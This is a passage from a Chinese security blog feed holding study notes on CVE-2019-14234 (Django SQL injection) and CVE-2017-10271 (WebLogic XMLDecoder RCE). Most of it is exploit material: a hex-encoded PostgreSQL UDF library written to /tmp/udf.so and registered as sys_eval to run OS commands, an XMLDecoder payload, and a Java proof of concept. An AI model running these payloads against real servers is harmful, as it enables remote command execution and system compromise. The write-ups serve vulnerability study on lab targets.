656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, <span class="keyword">decode</span>(<span class="string">'616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e313400474c4942435f322e3400474c4942435f322e322e3500000000000200020000000200020002000300020002000200020002000000040000000200020002000200020002000200000000000200000002000100010001000100010001000100010001000100010001000100010001000100010003009b01000010000000000000009491960600000400bd010000100000001469690d00000300c801000010000000751a690900000200d201000000000000001e2000000000000800000000000000a00e000000000000081e2000000000000800000000000000600e000000000000d8202000000000000800000000000000d820200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000e0000000000000000000000e81f20000000000006000000180000000000000000000000f01f20000000000006000000190000000000000000000000f81f200000000000060000001a00000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000000b00000000000000000000006020200000000000070000000c00000000000000000000006820200000000000070000002500000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000f0000000000000000000000802020000000000007000000100000000000000000000000882020000000000007000000110000000000000000000000902020000000000007000000120000000000000000000000982020000000000007000000130000000000000000000000a02020000000000007000000140000000000000000000000a82020000000000007000000150000000000000000000000b02020000000000007000000160000000000000000000000b82020000000000007000000170000000000000000000000c020200000000000070000001b0000000000000000000000c820200000000000070000001c0000000000000000000000d020200000000000070000002c00000000000000000000004883ec08488b05c51320004885c07405e89b0100004883c408c3000000000000ff35d2132000ff25d41320000f1f4000ff25d21320006800000000e9e0ffffffff25ca1320006801000000e9d0ffffffff25c21320006802000000e9c0ffffffff25ba1320006803000000e9b0ffffffff25b21320006804000000e9a0ffffffff25aa1320006805000000e990ffffffff25a21320006806000000e980ffffffff259a1320006807000000e970ffffffff25921320006808000000e960ffffffff258a1320006809000000e950ffffffff2582132000680a000000e940ffffffff257a132000680b000000e930ffffffff2572132000680c000000e920ffffffff256a132000680d000000e910ffffffff2562132000680e000000e900ffffffff255a132000680f000000e9f0feffffff25521320006810000000e9e0feffffff254a1320006811000000e9d0feffffff25421320006812000000e9c0feffffff253a1320006813000000e9b0feffffff25321320006814000000e9a0feffffff252a1320006815000000e990feffffff25221320006816000000e980feffffff251a1320006817000000e970feffffff251a1220006690ff252a1220006690488d3d09132000488d0509132000554829f84889e54883f80e7615488b05e61120004885c074095dffe0660f1f4400005dc30f1f4000662e0f1f840000000000488d3dc9122000488d35c2122000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05b11120004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d7912200000752748833d8711200000554889e5740c488b3d5a122000e845ffffffe848ffffff5dc6055012200001f3c30f1f4000662e0f1f840000000000488d3d690f200048833f00750be95effffff660f1f440000488b05291120004885c074e9554889e5ffd05de940ffffff554889e5488d05e50500005dc3554889e54883ec2048897de8488b45e88b00c1e80283e8048945f48b45f483c00148984889c7e818feffff488945f88b45f44863d0488b45e8488d4804488b45f84889ce4889c7e8d7fdffff8b45f44863d0488b45f84801d0c60000488b45f8c9c3554889e54883ec2048897de8488b45e84889c7e829fdffff4883c0044889c7e8bdfdffff488945f8488b45e84889c7e80dfdffff83c0048d148500000000488b45f88910488b45e84889c7e8f1fcffff4889c2488b45f8488d4804488b45e84889c64889cfe857fdffff488b45f8c9c3554889e5488d05220500005dc3554889e54883ec3048897dd8488b45d8488b40204889c7e838fdffff488945f0c745ec00000000488b45f04889c7e8f1fcffff488945f8488b45f84889c7e8b1fcffff89'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, <span class="keyword">decode</span>(<span class="string">'45ec488b45f84889c7e832fcffff488b45d8488b4020483b45f0740c488b45f04889c7e868fdffff8b45ec489889c0c9c3554889e5488d05a40400005dc3554889e54883ec5048897db8488b45b8488b40204889c7e8b6fcffff488945d8488b45d84889c7e876fcffff488945e0bf00040000e8a8fcffff488945e8bf01000000e89afcffff488945d0c745c800000000488b45d0c60000488b45e0488d350d0400004889c7e8b5fcffff488945f0eb55488b45e84889c7e8c3fbffff8945cc8b55c88b45cc01d04863d0488b45d04889d64889c7e866fcffff488945d08b45cc4863d08b45c84863c8488b45d04801c1488b45e84889c64889cfe850fbffff8b45cc0145c8488b55f0488b45e8be080000004889c7e8b5fbffff4885c07591488b45f04889c7e894fbffff488b45d00fb60084c074138b45c84898488d50ff488b45d04801d0c60000488b45d04889c7e85afcffff488945f8488b45f8c9c3554889e5488d05790300005dc3554889e54883ec4048897dc8488b45c8488b40204889c7e887fbffff488945e0488b45e08b00c1e80283e8048945d88b45d84898488945e8e8f6fbffff8945dc837ddc00790ab801000000e9ae000000837ddc000f8585000000bf1e000000e8affbffff4883e801488945f0488b55e8488b45f04801c2488b45f048f7d04821d0488945f0488b45f041b90000000041b800000000b921000000ba070000004889c6bf00000000e887faffff488945f848837df8ff7507b801000000eb40488b45e0488d4804488b55e8488b45f84889ce4889c7e80afaffff488b45f8ffd0837ddc007e148b45dcba01000000be0000000089c7e8eafaffffb800000000c9c3554889e5488d05700200005dc3554889e54883ec7048897d9864488b042528000000488945f831c0488b4598488b40204889c7e86bfaffff488945b048b83031323334353637488945e048b83839414243444546488945e8c645f000488b45b04889c7e80bfaffff488945b8488b45b8488d35ce0100004889c7e884faffff488945c048837dc0007512488b4598c6401c01b800000000e97f010000488b45c0ba02000000be000000004889c7e811faffff488b45c04889c7e8c5f9ffff8945ac488b45c0ba00000000be000000004889c7e8ecf9ffff8b45ac83c00148984889c7e8ccf9ffff488945c848837dc800751e488b45c04889c7e805f9ffff488b4598c6401c01b800000000e90b0100008b45ac4863f0488b55c0488b45c84889d1ba010000004889c7e8c5f8ffff488b45c04889c7e8c9f8ffff8b45ac01c083c00148984889c7e867f9ffff488945d0c745a400000000c745a800000000eb6b8b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb600c0f8040fbec083e00f48980fb64405e088028b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb6000fbec083e00f48980fb64405e088028345a4018b45a43b45ac7c8d8b45a84863d0488b45d04801d0c60000488b45d04889c7e854f9ffff488945d8488b45d04889c7e8d4f7ffff488b45c84889c7e8c8f7ffff488b45b84889c7e8bcf7ffff488b45d8488b4df86448330c25280000007405e8f4f7ffffc9c300004883ec084883c408c300000000000000720072620000000000000000000000001c0000008a030000640000002000000040000000010000000100000001000000010000000100000001000000011b033b680000000c00000044f7ffff84000000e4f9ffffac000000f1f9ffffcc00000053faffffec000000c3faffff0c010000d0faffff2c01000045fbffff4c01000052fbffff6c01000074fcffff8c01000081fcffffac01000081fdffffcc0100008efdffffec0100001400000000000000017a5200017810011b0c070890010000240000001c000000b8f6ffff90010000000e10460e184a0f0b770880003f1a3b2a332422000000001c0000004400000030f9ffff0d00000000410e108602430d06480c07080000001c000000640000001df9ffff6200000000410e108602430d06025d0c070800001c000000840000005ff9ffff7000000000410e108602430d06026b0c070800001c000000a4000000aff9ffff0d00000000410e108602430d06480c07080000001c000000c40000009cf9ffff7500000000410e108602430d0602700c070800001c000000e4000000f1f9ffff0d00000000410e108602430d06480c07080000001c00000004010000def9ffff2201000000410e108602430d06031d010c0708001c00000024010000e0faffff0d00000000410e108602430d06480c07080000001c00000044010000cdfaffff0001000000410e108602430d0602fb0c070800001c00000064010000adfbffff0d00000000410e108602430d06480c07080000001c000000840100009afbffff2402000000410e108602430d06031f020c070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, <span class="keyword">decode</span>(<span class="stringa00e000000000000600e000000000000000000000000000001000000000000009b010000000000000c00000000000000100c0000000000000d00000000000000a0140000000000001900000000000000001e2000000000001b0000000000000008000000000000001a00000000000000081e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000009806000000000000060000000000000060020000000000000a00000000000000de010000000000000b0000000000000018000000000000000300000000000000002020000000000002000000000000004002000000000000140000000000000007000000000000001700000000000000d009000000000000070000000000000010090000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f00000000d008000000000000ffffff6f000000000100000000000000f0ffff6f000000007608000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">4</span>, <span class="keyword">decode</span>(<span class="string">'181e20000000000000000000000000000000000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c000000000000060d000000000000160d000000000000260d000000000000360d000000000000460d000000000000560d000000000000660d000000000000760d000000000000860d000000000000960d000000000000a60d000000000000b60d000000000000d8202000000000004743433a20285562756e747520352e342e302d367562756e7475317e31362e30342e31312920352e342e30203230313630363039000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300600200000000000000000000000000000000000003000400980600000000000000000000000000000000000003000500760800000000000000000000000000000000000003000600d00800000000000000000000000000000000000003000700100900000000000000000000000000000000000003000800d00900000000000000000000000000000000000003000900100c00000000000000000000000000000000000003000a00300c00000000000000000000000000000000000003000b00c00d00000000000000000000000000000000000003000c00d00d00000000000000000000000000000000000003000d00a01400000000000000000000000000000000000003000e00b01400000000000000000000000000000000000003000f00ec1400000000000000000000000000000000000003001000581500000000000000000000000000000000000003001100001e20000000000000000000000000000000000003001200081e20000000000000000000000000000000000003001300101e20000000000000000000000000000000000003001400181e20000000000000000000000000000000000003001500d81f20000000000000000000000000000000000003001600002020000000000000000000000000000000000003001700d82020000000000000000000000000000000000003001800e0202000000000000000000000000000000000000300190000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001300101e20000000000000000000000000001900000002000c00d00d00000000000000000000000000001b00000002000c00100e00000000000000000000000000002e00000002000c00600e00000000000000000000000000004400000001001800e02020000000000001000000000000005300000001001200081e20000000000000000000000000007a00000002000c00a00e00000000000000000000000000008600000001001100001e2000000000000000000000000000a50000000400f1ff00000000000000000000000000000000bd00000001000e00c0140000000000001c00000000000000d000000001000e00dc140000000000000400000000000000de00000001000e00e0140000000000000400000000000000ec00000001000e00e4140000000000000400000000000000fa00000001000e00e8140000000000000400000000000000010000000400f1ff000000000000000000000000000000000801000001001000f81600000000000000000000000000001601000001001300101e2000000000000000000000000000000000000400f1ff000000000000000000000000000000002201000001001700d82020000000000000000000000000002f01000001001400181e20000000000000000000000000003801000000000f00ec1400000000000000000000000000004b01000001001700e02020000000000000000000000000005701000001001600002020000000000000000000000000006d01000012000000000000000000000000000000000000007f01000012000c00d00e0000000000000d000000000000008d0100001200000000000000000000000000000000000000a20100002000000000000000000000000000000000000000be01000012000c0060110000000000000d00000000000000d301000012000c0031100000000000000d00000000000000e501000012000000000000000000000000000000000000009f02000012000c00bc0f0000000000007500000000000000f801000010001700e0202000000000000000000000000000ff01000012000000000000000000000000000000000000001302000012000d00a01400000000000000000000000000001902000012000000000000000000000000000000000000002d02000012000000000000000000000000000000000000004902000012000000000000000000000000000000000000005b02000012000000000000000000000000000000000000006f02000012000000000000000000000000000000000000008302000012000000000000000000000000000000000000009602000012000c00af0f0000000000000d00000000000000a802000012000c00dd0e0000000000006200000000000000dc01000012000c003e100000000000002201000000000000bd0200001200000000000000000000000000000000000000d00200002000000000000000000000000000000000000000df0200001200000000000000000000000000000000000000f2020000100000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">5</span>, <span class="keyword">decode</span>(<span class="string">'00000000000000000303000012000000000000000000000000000000000000001703000010001800e82020000000000000000000000000001c03000012000000000000000000000000000000000000002f03000012000000000000000000000000000000000000004403000010001800e02020000000000000000000000000005003000012000000000000000000000000000000000000006503000012000000000000000000000000000000000000007803000012000000000000000000000000000000000000008b0300001200000000000000000000000000000000000000a00300002000000000000000000000000000000000000000b403000020000000000000000000000000000000000000001104000012000c007a120000000000002402000000000000ce0300002200000000000000000000000000000000000000ea03000012000900100c0000000000000000000000000000f00300001000000000000000000000000000000000000000c701000012000c006d110000000000000001000000000000f603000012000000000000000000000000000000000000000804000012000c006d120000000000000d000000000000001e04000012000c003f0f00000000000070000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37353934005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f706f737467726573716c7564665f7379732e630050675f6d616769635f646174612e35383133006d795f66696e666f2e35383331006d795f66696e666f2e35383436006d795f66696e666f2e35383639006d795f66696e666f2e35383838005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00667265654040474c4942435f322e322e350050675f6d616769635f66756e63007374726e6370794040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c650070675f66696e666f5f7379735f62696e6576616c0070675f66696e666f5f7379735f6576616c0066726561644040474c4942435f322e322e35005f65646174610066636c6f73654040474c4942435f322e322e35005f66696e69007374726c656e4040474c4942435f322e322e35005f5f737461636b5f63686b5f6661696c4040474c4942435f322e34006d6d61704040474c4942435f322e322e350073797374656d4040474c4942435f322e322e350070636c6f73654040474c4942435f322e322e350066676574734040474c4942435f322e322e350070675f66696e666f5f7379735f6578656300746578745f7074725f746f5f636861725f707472006674656c6c4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f006d656d6370794040474c4942435f322e31340070675f6465746f6173745f646174756d006d616c6c6f634040474c4942435f322e322e35005f656e6400667365656b4040474c4942435f322e322e35007265616c6c6f634040474c4942435f322e322e35005f5f6273735f737461727400776169747069644040474c4942435f322e322e3500706f70656e4040474c4942435f322e322e3500666f70656e4040474c4942435f322e322e3500737973636f6e664040474c4942435f322e322e35005f4a765f5265676973746572436c6173736573005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e697400706672656500666f726b4040474c4942435f322e322e350070675f66696e666f5f7379735f66696c6572656164006368725f7074725f746f5f746578745f70747200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000380000000b00000002000000000000006002000000000000600200000000000038040000000000000400000002000000080000000000000018000000000000004000000003000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">6</span>, <span class="keyword">decode</span>(<span class="string">'020000000000000098060000000000009806000000000000de0100000000000000000000000000000100000000000000000000000000000048000000ffffff6f0200000000000000760800000000000076080000000000005a0000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000d008000000000000d00800000000000040000000000000000400000001000000080000000000000000000000000000006400000004000000020000000000000010090000000000001009000000000000c0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000d009000000000000d009000000000000400200000000000003000000160000000800000000000000180000000000000078000000010000000600000000000000100c000000000000100c0000000000001a0000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000300c000000000000300c00000000000090010000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c00d000000000000c00d000000000000100000000000000000000000000000000800000000000000000000000000000087000000010000000600000000000000d00d000000000000d00d000000000000ce060000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000a014000000000000a014000000000000090000000000000000000000000000000400000000000000000000000000000093000000010000000200000000000000b014000000000000b0140000000000003c000000000000000000000000000000100000000000000000000000000000009b000000010000000200000000000000ec14000000000000ec140000000000006c00000000000000000000000000000004000000000000000000000000000000a900000001000000020000000000000058150000000000005815000000000000a401000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000bf0000000f0000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000cb000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000d0000000060000000300000000000000181e200000000000181e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d900000001000000030000000000000000202000000000000020000000000000d800000000000000000000000000000008000000000000000800000000000000e2000000010000000300000000000000d820200000000000d8200000000000000800000000000000000000000000000008000000000000000000000000000000e8000000080000000300000000000000e020200000000000e0200000000000000800000000000000000000000000000001000000000000000000000000000000ed0000000100000030000000000000000000000000000000e0200000000000003500000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000022e000000000000f6000000000000000000000000000000010000000000000000000000000000000100000002000000000000000000000000000000000000001821000000000000b8080000000000001c0000003200000008000000000000001800000000000000090000000300000000000000000000000000000000000000d0290000000000003204000000000000000000000000000001000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">'/tmp/udf.so'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> sys_eval(<span class="built_in">text</span>) <span class="keyword">RETURNS</span> <span class="built_in">text</span> <span class="keyword">AS</span> <span class="string">'/tmp/udf.so'</span>, <span class="string">'sys_eval'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="literal">NULL</span> <span class="keyword">INPUT</span> IMMUTABLE;  <span class="comment">#执行命令</span></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'id'</span>);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval(<span class="built_in">text</span>);  <span class="comment">#删除函数</span></span><br></pre></td></tr></table></figure></div><h2 id="瞎扯一会"><a href="#瞎扯一会" class="headerlink" title="瞎扯一会"></a>瞎扯一会</h2><p>这个CVE还有很多要学习的，先挖个坑，后面去花些时间了解一下 <code>jsonField</code><br>(ps: 自己挖的坑越来越多了)</p><p>开学了，每天最近因为一些新的考研政策出台，搞得自己有些焦虑急躁，慢慢静下心来好好准备吧。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/5896" target="_blank" rel="noopener">CVE-2019-14234 Django JSON SQL注入 分析</a><br><a href="https://www.leavesongs.com/penetration/django-jsonfield-cve-2019-14234.html" target="_blank" rel="noopener">Django JSONField SQL注入漏洞（CVE-2019-14234）分析与影响</a><br><a href="https://blog.csdn.net/qq_41420747/article/details/103539487" target="_blank" rel="noopener">CVE-2019-14234笔记</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 &lt;code&gt;Django 1.11.x&lt;/code&gt;（1.11.23之前），2.1.x（2.1.11之前）和2.2.x（2.2.4之前）中发现了一个问题。 由于&lt;code&gt;shallow key&lt;/code&gt;转换中的错误，&lt;code&gt;django.contrib.postgres.fields.JSONField&lt;/code&gt; 的关键字和索引查找以及 &lt;code&gt;django.contrib.postgres.fields.HStoreField&lt;/code&gt; 的关键字查找受到SQL注入。 &lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="渗透" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-10271漏洞学习</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/16/cve_2017_10271/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/16/cve_2017_10271/</id>
    <published>2020-02-16T14:07:56.135Z</published>
    <updated>2020-02-16T13:17:19.194Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>Weblogic是oracle推出的application server，由于其具有支持EJB、JSP、JMS、XML等多种语言、可扩展性、快速开发等多种特性，备受广大系统管理员的青睐。根据不完全统计weblogic约占全球市场份额1/3，正因为这么高的占有率，也造成每次weblogic有新的漏洞，都会在业内引起轩然大波。在2017年接近尾声时，weblogic又再次给大家带来了巨大惊喜，CVE-2017-10271漏洞又一次席卷了政府、银行等各大行业。</p><a id="more"></a><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><code>CVE-2017-10271</code>漏洞主要是由<code>WebLogic Server WLS</code>组件远程命令执行漏洞<br>由 <code>wls-wsat.war</code> 触发该漏洞，触发漏洞url如下：<br><code>http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType</code><br>通过 post数据包，构造 <code>SOAP（XML）</code> 格式的请求，在解析的过程中导致 <code>XMLDecoder反序列化</code> 漏洞，导致可执行任意命令。</p><hr><h2 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h2><p>简单弹个计算器，创建个 <code>ts.xml</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"13.0.2"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>然后利用 <code>Poc.java</code> ，实现漏洞复现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMLDecoderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        java.io.File file = <span class="keyword">new</span> java.io.File(<span class="string">"pathname: xx/xx/xx/ts.xml"</span>);</span><br><span class="line"></span><br><span class="line">        java.beans.XMLDecoder xd = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            xd = <span class="keyword">new</span> java.beans.XMLDecoder(<span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object s2 = xd.readObject();</span><br><span class="line">        xd.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" class="lazyload"></a></p><hr><h1 id="靶机测试"><a href="#靶机测试" class="headerlink" title="靶机测试"></a>靶机测试</h1><p>因为没有找到老版本的weblogic，只好用p神的vulhub来复现测试一下</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" class="lazyload"></a></p><hr><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>访问 <code>http://your-ip:7001/wls-wsat/CoordinatorPortType11</code> 存在下面这种情况</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" class="lazyload"></a></p><p>然后写入 <code>payload</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 